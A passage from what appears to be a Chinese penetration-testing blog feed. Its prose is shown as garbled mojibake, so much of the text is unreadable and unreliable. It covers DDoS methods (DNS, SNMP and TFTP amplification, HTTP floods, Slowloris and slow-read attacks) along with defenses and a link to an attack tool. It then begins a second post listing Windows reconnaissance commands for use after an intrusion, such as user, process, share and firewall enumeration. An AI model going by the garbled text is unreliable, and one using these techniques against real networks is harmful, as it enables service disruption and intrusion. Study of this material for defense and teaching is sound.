¹æ®è¿™ä¸ªä¿¡æ¯ç”Ÿæˆå“åº”æŠ¥æ–‡ã€‚æœ€åçœ‹ä¸€ä¸‹DNSæ”¾å¤§æ”»å‡»æ¼”ç¤ºå›¾ # å››ä¸ªæ­¥éª¤ 1.æ”»å‡»è€…ä½¿ç”¨å—æŸç«¯ç‚¹å°†å¸¦æœ‰æ¬ºéª—æ€§IPåœ°å€çš„UDPæ•°æ®åŒ…å‘é€åˆ°DNS recursor(é€’å½’)ã€‚æ•°æ®åŒ…ä¸Šçš„æ¬ºéª—åœ°å€æŒ‡å‘å—å®³è€…çš„çœŸå®IPåœ°å€ã€‚ 2.æ¯ä¸ªUDPæ•°æ®åŒ…éƒ½å‘DNSè§£æå™¨å‘å‡ºè¯·æ±‚ï¼Œé€šå¸¸ä¼šä¼ é€’è¯¸å¦‚â€œANYâ€ä¹‹ç±»çš„å‚æ•°ï¼Œä»¥ä¾¿æ¥æ”¶å¯èƒ½çš„æœ€å¤§å“åº”ã€‚ 3.åœ¨æ”¶åˆ°è¯·æ±‚åï¼Œå°è¯•é€šè¿‡å“åº”æä¾›å¸®åŠ©çš„DNSè§£æå™¨ä¼šå‘æ¬ºéª—çš„IPåœ°å€å‘é€å¤§é‡å“åº”ã€‚ 4.ç›®æ ‡çš„IPåœ°å€æ¥æ”¶å“åº”ï¼Œå‘¨å›´çš„ç½‘ç»œåŸºç¡€è®¾æ–½å› æµé‡æ³›æ»¥è€Œå˜å¾—ä¸å ªé‡è´Ÿï¼Œå¯¼è‡´æ‹’ç»æœåŠ¡ã€‚ è™½ç„¶ä¸€äº›è¯·æ±‚ä¸è¶³ä»¥å–æ¶ˆç½‘ç»œåŸºç¡€è®¾æ–½ï¼Œä½†å½“æ­¤åºåˆ—åœ¨å¤šä¸ªè¯·æ±‚å’ŒDNSè§£æå™¨ä¹‹é—´æˆå€å¢åŠ æ—¶ï¼Œç›®æ ‡æ¥æ”¶çš„æ•°æ®æ”¾å¤§å¯èƒ½å¾ˆå¤§ã€‚ é˜²å¾¡çš„è¯ï¼Œå¯ä»¥å‚è€ƒä»¥ä¸‹å‡ ç‚¹ï¼š è”ç³»ISPæ¸…æ´—ä¸Šæ¸¸æµé‡ï¼› DNSæœåŠ¡å™¨åªå¯¹å¯ä¿¡åŸŸå†…æä¾›æœåŠ¡ï¼Œé™åˆ¶å¯¹åŸŸå¤–ç”¨æˆ·æä¾›DNSè§£ææœåŠ¡ï¼› å¯¹å•ä¸ªIPçš„æŸ¥è¯¢é€Ÿç‡åšé™åˆ¶ï¼› æ‹¥æœ‰è¶³å¤Ÿçš„å¸¦å®½æ‰¿å—å°è§„æ¨¡æ”»å‡»ï¼› å…³é—­DNSæœåŠ¡å™¨çš„é€’å½’æŸ¥è¯¢ï¼› åˆ©ç”¨é˜²ç«å¢™ç­‰å¯¹ANY Requestè¿›è¡Œè¿‡æ»¤ã€‚ æºIPéªŒè¯ - åœæ­¢æ¬ºéª—æ•°æ®åŒ…ç¦»å¼€ç½‘ç»œ 9.SNMPæ”¾å¤§æ”»å‡»SNMP(Simple Network Management Protocolï¼Œç®€å•ç½‘ç»œç®¡ç†åè®®)ï¼Œå®ƒä½¿ç”¨UDP 161ç«¯å£è¿›è¡Œé€šä¿¡æ”»å‡»è€…å‘äº’è”ç½‘ä¸Šå¼€å¯SNMPæœåŠ¡çš„è®¾å¤‡å‘é€GetBulkè¯·æ±‚ï¼Œå¹¶ä½¿ç”¨é»˜è®¤é€šä¿¡å­—ç¬¦ä¸²ä½œä¸ºè®¤è¯å‡­æ®ã€‚å¸¸è§çš„é»˜è®¤é€šä¿¡å­—ç¬¦ä¸²å¦‚publicã€privateä»¥åŠä¸€äº›å‚å•†é»˜è®¤çš„é€šä¿¡å­—ç¬¦ä¸²ã€‚GetBulkè¯·æ±‚æ˜¯åœ¨SNMPv2ä¸­æ·»åŠ çš„çš„ï¼Œè¯¥è¯·æ±‚ä¼šè®©SNMPè®¾å¤‡å°½å¯èƒ½å¤šçš„è¿”å›æ•°æ®ï¼Œè¿™ä¹Ÿå°±æ˜¯SNMPæ”¾å¤§æ”»å‡»çš„åˆ©ç”¨ç‚¹ æ”»å‡»è€…å…ˆå°†æºåœ°å€æ”¹æˆè¦æ”»å‡»çš„ç›®æ ‡IPï¼Œå†ä½¿ç”¨é»˜è®¤çš„é€šä¿¡å­—ç¬¦ä¸²ï¼Œå‘å¤§é‡SNMPè®¾å¤‡å‘å‡ºGetBulkè¯·æ±‚ï¼Œè®¾å¤‡æ”¶åˆ°GetBulkè¯·æ±‚æ•°æ®åŒ…åï¼Œä¼šå°†ä¸€å¤§æ®µçš„è®¾å¤‡æ£€ç´¢ä¿¡æ¯è¿”å›ç»™ç›®æ ‡ä¸»æœºï¼Œæœ€ç»ˆç›®æ ‡ä¸»æœºä¼šè¢«è¿™äº›SNMPè®¾å¤‡è¿”å›çš„æ•°æ®åŒ…æ·¹æ²¡ï¼Œå¯¼è‡´æ‹’ç»æœåŠ¡ã€‚ é˜²å¾¡æªæ–½ï¼š ç¦æ­¢å·²å¼€å¯SNMPçš„è®¾å¤‡å“åº”GetBulkè¯·æ±‚ï¼Œé¿å…è‡ªå·±çš„è®¾å¤‡è¢«é»‘å®¢åˆ©ç”¨ï¼› æ›´æ”¹é»˜è®¤çš„é€šä¿¡å­—ç¬¦ä¸²ï¼› ä¿®æ”¹é»˜è®¤ç«¯å£161ï¼› éšè—å¼€å¯SNMPè®¾å¤‡çš„å…¬ç½‘IP 10.TFTPæ”¾å¤§æ”»å‡»TFTPï¼ˆTrivial File Transfer Protocolï¼Œç®€å•æ–‡ä»¶ä¼ è¾“åè®®ï¼‰ï¼Œä½¿ç”¨UDP 69ç«¯å£è¿›è¡Œé€šä¿¡ã€‚ç”±äºTFTPä½¿ç”¨çš„æ˜¯ä¸å¯é çš„UDPåè®®ï¼Œæ‰€ä»¥ä»–ä¸èƒ½ç¡®ä¿å‘é€çš„ä»»ä½•æŠ¥æ–‡éƒ½èƒ½çœŸæ­£åˆ°è¾¾ç›®çš„åœ°ï¼Œå› æ­¤ä»–å¿…é¡»ä½¿ç”¨å®šæ—¶å™¨æ¥æ£€æµ‹å¹¶é‡ä¼ æŠ¥æ–‡ FTPåè®®å°†æ•°æ®åˆ†æˆå¥½å¤šä¸ªæ•°æ®å—è¿›è¡Œä¼ è¾“ï¼Œæ¯ä¸ªæ•°æ®å—æœ€å¤§ä¸º512å­—èŠ‚ï¼Œå®¢æˆ·ç«¯åœ¨æ¥å—åˆ°æ•°æ®å—æ—¶ï¼Œéœ€è¦ç»™æœåŠ¡å™¨ç«¯è¿”å›ä¸€ä¸ªACKç¡®è®¤æŠ¥æ–‡ï¼Œç„¶åæ‰ä¼šç»§ç»­ä¼ è¾“ä¸‹ä¸€ä¸ªæŠ¥æ–‡ã€‚è‹¥æœåŠ¡å™¨æ²¡æœ‰æ”¶åˆ°å®¢æˆ·ç«¯å‘æ¥ACKæŠ¥æ–‡ï¼Œåˆ™åœ¨æ—¶é—´åˆ°è¾¾è¶…æ—¶è®¡æ•°å™¨æ—¶ï¼Œä¾¿ä¼šå¼€å¯é‡ä¼ æœºåˆ¶ï¼Œè¿™ä¹Ÿå°±æ˜¯æ”»å‡»åˆ©ç”¨ç‚¹ã€‚æ”»å‡»è€…åˆ©ç”¨TFTPåè®®ä¸Šçš„ç¼ºé™·ï¼Œä¼ªé€ æºåœ°å€å‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚ï¼ŒæœåŠ¡å™¨å›å¤çš„ç¬¬1ä¸ªdataæ•°æ®åŒ…åæ— æ³•æ”¶åˆ°å®¢æˆ·ç«¯å‘é€çš„ACKã€‚æ­¤æ—¶TFTPå°±ä¼šåˆ©ç”¨ä»–çš„é‡ä¼ æœºåˆ¶ï¼Œå®šæ—¶é‡ä¼ ç¬¬1ä¸ªdataæ•°æ®åŒ…ï¼Œå½“æ”»å‡»è€…å‘å‡ºå¤§é‡çš„è¿™ç§è¯·æ±‚æ—¶ï¼ŒTFTPæ”¾å¤§æ”»å‡»ä¹Ÿå°±å‘ç”Ÿäº† é˜²å¾¡æ–¹æ¡ˆå¯å‚è€ƒå¦‚ä¸‹ï¼š ä¸è¦å°†TFTPæœåŠ¡å™¨æš´éœ²åœ¨å…¬ç½‘ä¸Šï¼› å¯¹æµç»TFTPæœåŠ¡çš„æµé‡è¿›è¡Œå…¥ä¾µæ£€æµ‹ï¼› å°†é‡ä¼ ï¼ˆæ•°æ®åŒ…ï¼‰ç‡è®¾ç½®ä¸º1ï¼› åªä¸ºä¿¡ä»»åŸŸå†…çš„ä¸»æœºæä¾›æœåŠ¡ã€‚ 11.CCæ”»å‡»CCæ”»å‡»ï¼ˆChallengeCollapsarï¼‰åˆç§°ä½œHTTP æ³›æ´ªæ”»å‡»ã€‚åŸç†æ˜¯æ”»å‡»è€…æ§åˆ¶è‚‰é¸¡ã€åƒµå°¸ç½‘ç»œæˆ–ä½¿ç”¨ä»£ç†æœåŠ¡å™¨ï¼Œä¸åœåœ°å‘ç›®æ ‡çš„webæœåŠ¡å‘é€å¤§é‡åˆæ³•è¯·æ±‚ï¼Œä½¿å¾—æ­£å¸¸ç”¨æˆ·çš„webè¯·æ±‚å¤„ç†ç¼“æ…¢ç”šè‡³å¾—ä¸åˆ°å¤„ç†ï¼Œåˆ¶é€ å¤§é‡çš„åå°æ•°æ®åº“æŸ¥è¯¢åŠ¨ä½œï¼Œæ¶ˆè€—ç›®æ ‡CPUèµ„æºï¼Œæœ€ç»ˆå¯¼è‡´æœåŠ¡å™¨å®•æœºå´©æºƒã€‚è¿™ç§æ”»å‡»æ–¹å¼ä¸éœ€è¦å¾ˆå¤§çš„å¸¦å®½ï¼Œä¸”æ— æ³•ä½¿ç”¨ä¼ªé€ IPåœ°å€è¿›è¡Œæ”»å‡»ï¼Œéœ€è¦çœŸå®çš„æœºå™¨ä¸webæœåŠ¡å™¨å»ºç«‹è¿æ¥ï¼Œå› ä¸ºHTTPåè®®æ˜¯å»ºç«‹åœ¨TCPåè®®ä¸Šï¼Œå¿…é¡»å…ˆè¿›è¡ŒTCPä¸‰æ¬¡æ¡æ‰‹æ‰èƒ½è¿›è¡ŒHTTPé€šä¿¡ã€‚å¦‚æœç›®æ ‡webæœåŠ¡å™¨æ”¯æŒHTTPSï¼Œé‚£ä¹ˆå‘èµ·çš„HTTPSæ³›æ´ªæ”»å‡»è¿˜èƒ½ç©¿é€ä¸€äº›é˜²æŠ¤è®¾å¤‡ã€‚ ddosæ”»å‡»å’Œccæ”»å‡»åŒºåˆ«çŸ¥ä¸»è¦æ˜¯é’ˆå¯¹å¯¹è±¡çš„ä¸åŒï¼šddosæ˜¯ä¸»è¦é’ˆå¯¹IPçš„æ”»å‡»ï¼Œè€ŒCCæ”»å‡»çš„ä¸»è¦æ˜¯ç½‘é¡µã€‚CCæ”»å‡»ç›¸å¯¹æ¥è¯´ï¼Œæ”»å‡»çš„å±å®³ä¸æ˜¯æ¯ç­æ€§çš„ï¼Œä½†æ˜¯æŒç»­æ—¶é—´é•¿;è€Œddosæ”»å‡»å°±æ˜¯æµé‡æ”»å‡»ï¼Œè¿™ç§æ”»å‡»çš„å±å®³æ€§è¾ƒå¤§ï¼Œé€šè¿‡å‘ç›®æ ‡æœåŠ¡å™¨å‘é€å¤§é‡æ•°æ®åŒ…ï¼Œé“è€—å°½å…¶å¸¦å®½ï¼Œæ›´éš¾é˜²å¾¡ã€‚ é˜²å¾¡æ–¹æ¡ˆï¼š å¿…è¦æ—¶å°†ç½‘é¡µåšæˆé™æ€ï¼Œå‡å°‘æ•°æ®åº“çš„ä½¿ç”¨ï¼› é€šè¿‡ç¼“å­˜çš„æ–¹å¼è¿›è¡Œï¼Œå°½é‡ç”±è®¾å¤‡çš„ç¼“å­˜ç›´æ¥è¿”å›ç»“æœæ¥ä¿æŠ¤åç«¯ä¸šåŠ¡ TokenéšIPåœ°å€å˜åŒ– é™åˆ¶è¿æ¥æ•°é‡ï¼› ä¿®æ”¹æœ€å¤§è¶…æ—¶æ—¶é—´ï¼› è®©ç”¨æˆ·æ‰‹åŠ¨è¾“å…¥éªŒè¯ç ï¼› åœ¨responseæŠ¥æ–‡ä¸­æ·»åŠ ç‰¹æ®Šå­—æ®µï¼ŒéªŒè¯IPåˆæ³•æ€§ï¼› å±è”½é¢‘ç¹è®¿é—®æœåŠ¡å™¨çš„ä¸»æœºIPã€‚ ä¸€ä¸ªé˜²CCæ”»å‡»çš„è„šæœ¬ï¼šhttps://zhangge.net/4649.html å‚è€ƒæ–‡ç« ï¼šhttps://www.jianshu.com/p/dff5a0d537d8 12.HTTPæ…¢é€Ÿæ”»å‡»Slow HTTP Dos AttACKsï¼ˆæ…¢é€ŸHTTPæ‹’ç»æœåŠ¡æ”»å‡»ï¼‰é»‘å®¢æ¨¡æ‹Ÿæ­£å¸¸ç”¨æˆ·å‘webæœåŠ¡å™¨å‘é€æ…¢é€Ÿhttpè¯·æ±‚ï¼Œç”±äºæ˜¯æ…¢é€Ÿçš„ï¼ŒæœåŠ¡å™¨ç«¯éœ€è¦ä¿æŒè¿æ¥èµ„æºï¼Œç›´åˆ°æ•°æ®ä¼ è¾“ç»“æŸæˆ–è¯·æ±‚ç»“æŸæ‰å¯é‡Šæ”¾è¿æ¥ã€‚å½“æœåŠ¡å™¨ç«¯å»ºç«‹äº†å¤§é‡è¿™æ ·çš„æ…¢é€Ÿè¿æ¥ï¼Œå°±ä¼šå¯¼è‡´æœåŠ¡å™¨æ‹’ç»æœåŠ¡ã€‚è¿™ç§æ”»å‡»å¯ä»¥åˆ†ä¸ºä¸¤ç±»ï¼šä¸€ç±»æ˜¯å®¢æˆ·ç«¯å‘æ•°æ®ï¼Œå¦ä¸€ç±»æ˜¯å®¢æˆ·ç«¯è¯»å–æœåŠ¡å™¨å‘æ¥çš„æ•°æ®ã€‚HTTPæ…¢é€Ÿæ”»å‡»å¯¹åŸºäºçº¿ç¨‹å¤„ç†çš„webæœåŠ¡å™¨å½±å“æ˜¾è‘—ï¼Œå¦‚apacheã€dhttpdï¼Œè€Œå¯¹åŸºäºäº‹ä»¶å¤„ç†çš„webæœåŠ¡å™¨å½±å“ä¸å¤§ï¼Œå¦‚nginxã€lighttpdã€‚ HTTPæ…¢é€Ÿæ”»å‡»è¿˜å¯ä»¥ç»†åˆ†æˆä»¥ä¸‹å‡ ç§æ”»å‡»æ–¹å¼ï¼ša. Slowlorisæ”»å‡»æ–¹å¼ HTTPåè®®è§„å®šè¯·æ±‚å¤´ä»¥ä¸€ä¸ªç©ºè¡Œç»“æŸï¼Œæ‰€ä»¥å®Œæ•´çš„httpè¯·æ±‚å¤´ç»“å°¾æ˜¯\r\n\r\nã€‚ ç„¶è€Œ'ä½¿ç”¨éæ­£å¸¸çš„\r\næ¥ç»“å°¾'ï¼Œå°±ä¼šå¯¼è‡´æœåŠ¡ç«¯è®¤ä¸ºæˆ‘ä»¬çš„è¯·æ±‚å¤´è¿˜æ²¡ç»“æŸï¼Œç­‰å¾…æˆ‘ä»¬ç»§ç»­å‘é€æ•°æ®ç›´åˆ°è¶…æ—¶æ—¶é—´ã€‚ # CRLFï¼ˆCarriage Return Line Feedï¼‰è¡¨ç¤ºå›è½¦æ¢è¡Œ b. Slow postæ”»å‡»æ–¹å¼ åœ¨httpå¤´éƒ¨ä¿¡æ¯ï¼Œå¯ä»¥ä½¿ç”¨content-lengthå£°æ˜HTTPæ¶ˆæ¯å®ä½“çš„ä¼ è¾“é•¿åº¦ï¼ŒæœåŠ¡å™¨ç«¯ä¼šcontent-lengthçš„å€¼ä½œä¸ºHTTP BODYçš„é•¿åº¦ã€‚ åˆ©ç”¨è¿™ä¸€ç‰¹ç‚¹ï¼Œæ”»å‡»è€…'æŠŠcontent-lengthè®¾ç½®å¾—å¾ˆå¤§çš„ï¼Œç„¶åç¼“æ…¢å‘é€æ•°æ®éƒ¨åˆ†'ï¼Œæ¯”å¦‚ä¸€æ¬¡åªå‘é€ä¸€ä¸ªå­—èŠ‚ï¼Œè¿™æ ·æœåŠ¡å™¨ç«¯å°±è¦ä¸€ç›´ä¿æŒè¿æ¥ï¼Œç›´åˆ°å®¢æˆ·ç«¯ä¼ å®Œæ‰€æœ‰çš„æ•°æ®ã€‚ # åˆ©ç”¨å·¥å…· slowloris https://github.com/gkbrk/slowloris.git å‚è€ƒæ–‡ç« ï¼šhttps://www.fujieace.com/hacker/tools/slowloris-dos.html c. Slow readæ”»å‡»æ–¹å¼ æ”»å‡»è€…å‘é€ä¸€ä¸ªå®Œæ•´çš„HTTPæ•°æ®è¯·æ±‚ï¼Œä¹‹åæœåŠ¡å™¨ä¼šç»™å‡ºå“åº”ï¼Œè¿™æ—¶æ”»å‡»è€…å†'å°†è‡ªå·±çš„TCPçª—å£å¤§å°è®¾ç½®çš„å¾ˆå°'ï¼ŒæœåŠ¡å™¨ä¼šæ ¹æ®å®¢æˆ·çš„TCPçª—å£å¤§å°æ¥ä¼ é€æ•°æ®ã€‚ ç”±äºå®¢æˆ·ç«¯çš„TCPçª—å£å¤§å°å¾ˆå°ï¼ŒæœåŠ¡å™¨åªèƒ½ç¼“æ…¢çš„ä¼ è¾“æ•°æ®ç»™å®¢æˆ·ç«¯ã€‚å½“å»ºç«‹å¤§é‡çš„è¿™ç§è¿æ¥æ—¶ï¼Œwebåº”ç”¨çš„å¹¶å‘è¿æ¥æ± å°†è¢«è€—å°½ï¼Œæœ€ç»ˆå¯¼è‡´æ‹’ç»æœåŠ¡ã€‚ d. Apache range headeræ”»å‡» # è¿™ç§æ”»å‡»æ–¹å¼åªé’ˆå¯¹apache å½“å®¢æˆ·ç«¯ä¼ è¾“å¤§æ–‡ä»¶æ—¶ä¼šæœ‰rangeå­—æ®µï¼Œè¡¨ç¤ºå°†å¤§æ–‡ä»¶åˆ†æ®µï¼Œåˆ†æˆå‡ ä¸ªå°æ®µè¿›è¡Œä¼ è¾“ã€‚ ä¾‹å¦‚æ”»å‡»è€…å°†ä¸€ä¸ªæ–‡ä»¶æŒ‰ç…§ä¸€ä¸ªå­—èŠ‚ä¸€æ®µï¼Œåˆ†æˆå¥½å¤šæ®µï¼Œè¿™æ ·å°±ä¼šé€ æˆä¼ è¾“æ•°æ®ç¼“æ…¢ï¼Œé•¿æ—¶é—´å ç”¨è¿æ¥ï¼Œæ¶ˆè€—æœåŠ¡å™¨CPUå’Œå†…å­˜èµ„æº é˜²å¾¡è¿™é‡Œè‡³åªçœ‹apacheçš„é˜²æŠ¤ç­–ç•¥(å…·ä½“çš„éœ€è¦å®è·µ) # è®¾ç½®å¹¶ä½¿ç”¨ä»¥ä¸‹æ¨¡å— mod_reqtimeout æ¨¡å— # æ§åˆ¶è¯·æ±‚æ•°æ®ä¼ è¾“çš„è¶…æ—¶æ—¶é—´åŠæœ€å°é€Ÿç‡ mod_qos æ¨¡å— # Apacheçš„ä¸€ä¸ªæœåŠ¡è´¨é‡æ§åˆ¶æ¨¡å—ï¼Œç”¨æˆ·å¯é…ç½®å„ç§ä¸åŒé˜ˆå€¼ mod_securityæ¨¡å— # ä¸€ä¸ªå¼€æºçš„WAFæ¨¡å—ï¼Œæœ‰ä¸“é—¨é’ˆå¯¹æ…¢é€Ÿæ”»å‡»é˜²æŠ¤çš„è§„åˆ™ å¯¹äºå…¶ä»–ä¸­é—´ä»¶ï¼šå‚è€ƒæ–‡ç«  13.XSS-DOSåˆ©ç”¨ç½‘ç«™å­˜åœ¨çš„å­˜å‚¨å‹XXSæ¼æ´ï¼Œåœ¨ç½‘ç«™ä¸­æ’å…¥æ¶æ„çš„javascriptä»£ç ã€‚ä»£ç çš„åŠŸèƒ½æ˜¯ä¸æ–­å‘webæœåŠ¡å™¨å‘èµ·å¤§é‡è¯·æ±‚ï¼Œä»è€Œå¯¼è‡´æœåŠ¡å™¨å®•æœºï¼Œæ— æ³•å“åº”æ­£å¸¸ç”¨æˆ·çš„è¯·æ±‚ ç”±äºè¿™ç§æ”»å‡»çš„æ˜¯ç”±å­˜å‚¨å‹XSSå¯¼è‡´çš„ï¼Œæˆ‘ä»¬å†é˜²å¾¡æ–¹é¢å°±è¦è€ƒè™‘å¦‚ä½•é˜²å¾¡å­˜å‚¨å‹XSSã€‚é˜²å¾¡ç­–ç•¥å¦‚ä¸‹ï¼š å¯¹ç”¨æˆ·çš„è¾“å…¥ä»¥åŠurlå‚æ•°è¿›è¡Œç‰¹æ®Šå­—ç¬¦è¿‡æ»¤ï¼› å¯¹è¾“å‡ºå†…å®¹è¿›è¡Œç¼–ç è½¬æ¢ï¼› ç»“åˆé»‘ç™½åå•æœºåˆ¶; ç­‰é˜²å¾¡å­˜å‚¨å‹XSSçš„æ–¹å¼ 14.æ—¶é—´é€é•œæ”»å‡»é€šè¿‡æ§åˆ¶ç›¸åŒæºå’Œç›¸åŒç›®çš„IPæŠ¥æ–‡ï¼Œä½¿å¾—èµ°ä¸åŒè·¯å¾„çš„æ•°æ®åŒ…ï¼Œåœ¨åŒä¸€æ—¶åˆ»åˆ°è¾¾ç›®æ ‡æœåŠ¡å™¨ï¼Œä»è€Œè¾¾åˆ°æµé‡é›†ä¸­æ”»å‡»çš„ç›®çš„ã€‚ é˜²å¾¡æ–¹æ¡ˆï¼š å¢åŠ æŠ–åŠ¨ï¼Œå¹²æ‰°æ”»å‡»è·¯å¾„ï¼Œä½¿å¾—æ•°æ®åŒ…æ— æ³•é¢„æœŸåˆ°è¾¾ï¼› ç”±è¿è¥å•†ç¦æ­¢æºè·¯ç”±ã€‚ é‡‡ç”¨é«˜æ€§èƒ½çš„ç½‘ç»œè®¾å¤‡ï¼› å……è¶³çš„ç½‘ç»œå¸¦å®½ä¿è¯ï¼› å‡çº§ä¸»æœºæœåŠ¡å™¨ç¡¬ä»¶ï¼› é¿å…å°†æœåŠ¡å™¨çš„çœŸå®IPæš´éœ²åœ¨å…¬ç½‘ä¸­ï¼› ä½¿ç”¨CDNå¯¹æµé‡è¿›è¡Œç¨€é‡Šï¼Œå½“å¤§æµé‡ç¨€é‡Šåˆ°å„ä¸ªCDNèŠ‚ç‚¹æ—¶ï¼Œå†å¯¹æµé‡è¿›è¡Œæ¸…æ´—ï¼Œä»è€Œè¾¾åˆ°é˜²æŠ¤æºç«™çš„ç›®çš„ï¼ˆç„¶è€Œè¿™ç§é˜²å¾¡æ–¹å¼åªèƒ½ç”¨åœ¨å¯¹åŸŸåå‘èµ·çš„DDOSæ”»å‡»ï¼Œå¦‚æœæ”»å‡»è€…ç›´æ¥å¯¹IPè¿›è¡Œæ”»å‡»ï¼Œåˆ™éœ€è¦ä½¿ç”¨anycastæŠ€æœ¯æ¥é˜²å¾¡ï¼‰ã€‚ å¯ä»¥å‚è€ƒï¼šhttp://icir.org/vern/papers/lensing.oak15.pdfhttp://ieeexplore.ieee.org/stamp/stamp.jsp?arnumber=7163026https://www.cnblogs.com/h2zZhou/p/6513238.htmlhttps://www.youtube.com/watch?v=QwAHNnKDVxQhttps://mp.weixin.qq.com/s?__biz=MzI2NjUwNjU4OA==&amp;mid=2247483685&amp;idx=1&amp;sn=8ac38ff22d571bbbf7716cb9e83b9b35&amp;chksm=ea8c5916ddfbd00008d9b28e22fccba8c201ce78c70c2d78d10ee732f22a39ccf46d4b197634&amp;mpshare=1&amp;scene=23&amp;srcid=0831Wr5YJPYzSrQU6gnfGVd0 æ‰€æœ‰è¿™äº›æ–¹æ¡ˆéƒ½ä¸å®Œç¾å„æœ‰åˆ©å¼Šï¼Œæœ€ç»ˆçš„ç­–ç•¥å¯èƒ½æ˜¯å‡ ç§æ–¹æ¡ˆçš„ç»“åˆä½¿ç”¨ï¼Œå½¢æˆé˜²å¾¡ä½“ç³»ï¼Œå°†æ”»å‡»æå‰åŒ–è§£åœ¨å±€éƒ¨ï¼Œä¸è‡³äºå½±å“æ•´ä¸ªç³»ç»Ÿã€‚ å®è·µæš‚æ—¶æœ‰å¾…å®è·µ å‚è€ƒ(åŸºæœ¬æ˜¯å®Œå…¨å‚è€ƒå¤§ä½¬çš„ï¼Œæ•´ç†çš„å¤ªå…¨äº†)ï¼šhttps://xz.aliyun.com/t/71https://xz.aliyun.com/t/70 å…¶ä»–é“¾æ¥èµ„æºï¼šhttps://www.freebuf.com/articles/network/76021.htmlhttps://www.cnblogs.com/wuyuan2011woaini/p/5800062.htmlhttps://www.cnblogs.com/micr067/p/12519779.htmlhttps://yq.aliyun.com/articles/480125/ kaliä¸‹çš„DDosæµ‹è¯•å·¥å…· document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>DDos</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å†…ç½‘ç¬¬äºŒç« -å†…ç½‘åŸºç¡€ä¿¡æ¯æœé›†]]></title>
    <url>%2Fposts%2F54461%2F</url>
    <content type="text"><![CDATA[äºŒ . å†…ç½‘ä¿¡æ¯æ”¶é›† æœ¬æœºä¿¡æ¯æ”¶é›† 1)æŸ¥è¯¢ç½‘ç»œé…ç½® net view # æŸ¥çœ‹å·¥ä½œç»„ ipconfig /all # ä¹Ÿå¯ä»¥çœ‹åˆ°æ˜¯å¦æœ‰åŸŸ 2) æŸ¥è¯¢ç”¨æˆ·åˆ—è¡¨ net user # æŸ¥çœ‹æœ¬æœºç”¨æˆ·åˆ—è¡¨ net localgroup administrators # æœ¬æœºç®¡ç†å‘˜ï¼ˆé€šå¸¸å«æœ‰åŸŸç”¨æˆ·ï¼‰ query user || qwinsta # æŸ¥çœ‹å½“å‰åœ¨çº¿ç”¨æˆ·ï¼ˆæå‰çœ‹çœ‹ç®¡ç†å‘˜æ˜¯å¦åœ¨çº¿ï¼‰ # ä¼äº‹ä¸šå•ä½çš„ç”¨æˆ·åæœ‰è§„åˆ™æ€§ 3)æŸ¥è¯¢è¿›ç¨‹åˆ—è¡¨ # çœ‹è£…äº†ä»€ä¹ˆè½¯ä»¶,vpn,æ€æ¯’è½¯ä»¶,è™šæ‹Ÿæœº,æŸæœåŠ¡(æ¨æ•²åŸŸå†…æ˜¯å¦éƒ½è£…äº†è¿™ä¸ªè½¯ä»¶) # çœ‹è¿›ç¨‹è¿è¡Œçš„æƒé™ tasklist /v # æˆ–ç”¨wmic wmic process list brief 4) æŸ¥çœ‹æœ¬æœºæœåŠ¡ä¿¡æ¯ wmic service list brief 5) æŸ¥è¯¢æ“ä½œç³»ç»ŸåŠå®‰è£…è½¯ä»¶ç‰ˆæœ¬ä¿¡æ¯ # è·å–æ“ä½œç³»ç»Ÿå’Œç‰ˆæœ¬ä¿¡æ¯() systeminfo |findstr /B /C:"OS Name" /C:"OS Version" # è‹±æ–‡ç‰ˆæœ¬çš„è¯æ˜¯è¿™æ · systeminfo |findstr /B /C:"OS åç§°" /C:"OS ç‰ˆæœ¬" # ä¸­æ–‡ç‰ˆæœ¬çš„è¯æ˜¯è¿™æ · # æŸ¥çœ‹ç³»ç»Ÿä½“ç³»ç»“æ„ echo %PROCESSOR_ARCHITECTURE% # amd64 # æŸ¥çœ‹å®‰è£…è½¯ä»¶å’Œç‰ˆæœ¬ã€è·¯å¾„ç­‰ wmic product get name,version # powershellæŸ¥çœ‹å®‰è£…è½¯ä»¶ä¿¡æ¯ powershell "Get-WmiObject -class Win32_Product |Select-Object -Property name,version" 6) æŸ¥è¯¢ç«¯å£åˆ—è¡¨ netstat -ano # æ ¹æ®ç«¯å£ç»¼åˆåˆ¤æ–­ï¼Œå¦‚æœæ˜¯å†…å®¹ç”¨æ¥æ›´æ–°çš„æœåŠ¡å™¨/DNSæœåŠ¡å™¨/ä»£ç†æœåŠ¡å™¨ 7) æŸ¥è¯¢å¯åŠ¨ä¿¡æ¯ wmic startup get command,caption 8) æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡ schtasks /query /fo LIST /v 9) æŸ¥çœ‹ä¸»æœºå¼€æœºæ—¶é—´ net statistics workstation 10) åˆ—å‡ºæˆ–æ–­å¼€æœ¬åœ°è®¡ç®—æœºä¸æ‰€è¿æ¥çš„å®¢æˆ·ç«¯ä¹‹é—´çš„ä¼šè¯ net session 11) æŸ¥è¯¢è¡¥ä¸ä¿¡æ¯ systeminfo #å¯ä»¥çœ‹åˆ°å¾ˆå¤šä¿¡æ¯(åŸŸå†…ä¸»æœºè¡¥ä¸æ˜¯æ‰¹é‡æ‰“çš„) # æˆ–ç”¨wmic wmic qfe get Caption,Description,HostFixID,InstalledOn 12) æŸ¥è¯¢æœ¬æœºå…±äº« # é»˜è®¤æ˜¯å¼€ç€Cï¼ŒIPCï¼ŒADMINS # ä¸å•å•æ˜¯çœ‹æœ¬æœºçš„ä¿¡æ¯(é€šè¿‡æœ¬æœºåˆ¤æ–­åŸŸå†…æƒ…å†µ) net share net share \\yourHostname wmic share get name,path,status # wmicï¼š æ˜¯windowsè‡ªå¸¦çš„ä¸€ä¸ªå‘½ä»¤å·¥å…·ï¼Œæœ‰å¾ˆå¤šåŠŸèƒ½(äº¤äº’/éäº¤äº’æ¨¡å¼) 13) æŸ¥è¯¢è·¯ç”±è¡¨å’Œæ‰€æœ‰å¯ç”¨çš„ARPç¼“å­˜è¡¨ route print # arp -a 14) æŸ¥è¯¢é˜²ç«å¢™é…ç½® # 'æŸ¥çœ‹'é˜²ç«å¢™é…ç½® netsh firewall show config ## 